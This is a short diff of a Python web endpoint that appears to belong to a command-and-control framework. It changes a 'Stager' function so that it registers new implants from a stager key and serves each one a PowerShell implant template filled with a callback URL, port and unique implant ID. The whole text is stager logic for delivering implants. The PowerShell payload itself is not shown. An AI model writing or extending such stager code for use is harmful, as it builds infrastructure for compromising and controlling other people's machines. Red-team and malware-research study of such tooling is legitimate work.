@@ -28,15 +28,20 @@ def add_header( r):
 def Stager():
     # This needs to return the implant!
     print("@@",request.values['user'])
-    a=db.Get_ImplantFromKey(request.values['user'])
-    #print(a)
-    if a:
+    # -- THIS MAY NOT BE NEEDED OR HAVE BEEN REBUILD
+    # a=db.Get_ImplantFromStagerKey(request.values['user'])
+
+    # -- TODO:
+    # -- Build checking before triggering this!
+    b = db.Register_NewImplantFromStagerKey(request.values['user'])
+    print(b)
+    if b:
         from jinja2 import Environment, FileSystemLoader
         env = Environment(loader=FileSystemLoader('implant_core'))
         template = env.get_template('jinja_fudge.ps1')
-        print(a.callback_url,a.implant_key)
+        print(b[0]['callback_url'],b[0]['stager_key'])
         db.Update_ImplantLastCheckIn(request.values['user'])
-        output_from_parsed_template = template.render(url=a.callback_url, port=5000, uii=a.implant_key)
+        output_from_parsed_template = template.render(url=b[0]['callback_url'], port=5000, uii=b[0]['unique_implant_id'])
     else:
         return "404", 404
     #print(output_from_parsed_template)
